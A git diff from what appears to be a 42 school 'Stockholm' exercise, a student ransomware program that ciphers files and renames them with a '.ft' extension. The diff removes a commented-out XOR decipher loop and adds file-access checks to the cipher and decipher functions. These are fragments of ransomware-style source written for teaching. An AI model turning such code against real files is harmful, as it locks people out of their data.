@@ -6,7 +6,7 @@
 /*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/19 09:51:57 by bguyot            #+#    #+#             */
-/*   Updated: 2023/05/19 16:39:13 by bguyot           ###   ########.fr       */
+/*   Updated: 2023/05/19 16:50:04 by bguyot           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -106,42 +106,8 @@ void	Stockholm::_decipherFile(std::filesystem::path path)
 		
 	//cipher the file
 	try {
-		// int fd_in = open(path.c_str(), O_RDONLY);
-		// int fd_out = open(path.c_str(), O_WRONLY);
-		// if (fd_in == -1 || fd_out == -1)
-		// {
-		// 	// std::cout << "Error while opening file " << path << std::endl;
-		// 	return ;
-		// }
-		// char *buffer = new char[1024];
-		// bzero(buffer, 1024);
-		// int ret = 0;
-		// std::string file_data = "";
-		// ret = read(fd_in, buffer, 1024);
-		// while (ret > 0)
-		// {
-		// 	for (int i = 0; i < ret; i++)
-		// 	{
-		// 		buffer[i] ^= this->_key[i % this->_key.length()];
-		// 	}
-
-		// 	//read the next 1024 bytes, unless it's the end of the file
-		// 	if (ret == 1024)
-		// 		ret = read(fd_in, buffer, 1024);
-		// 	else
-		// 		ret = 0;
-		// }
-		// if (ret == -1)
-		// {
-		// 	// std::cout << "Error while reading file " << path << std::endl;
-		// 	return ;
-		// }
-		// close(fd_in);
-		// close(fd_out);
-		
-		// //remove the .ft extension to the file
-		// std::filesystem::path new_path = path;
-		// std::filesystem::rename(path, new_path.replace_extension(""));
+		if (access(path.c_str(), R_OK) == -1)
+			return ;
 
 		auto new_path = path;
 		new_path.replace_extension("");
@@ -203,6 +169,8 @@ void	Stockholm::_cipherFile(std::filesystem::path path)
 	
 	//cipher the file
 	try {
+		if (access(path.c_str(), R_OK) == -1)
+			return ;
 		auto new_path = path;
 		new_path.replace_extension(path.extension().string() + ".ft");
 
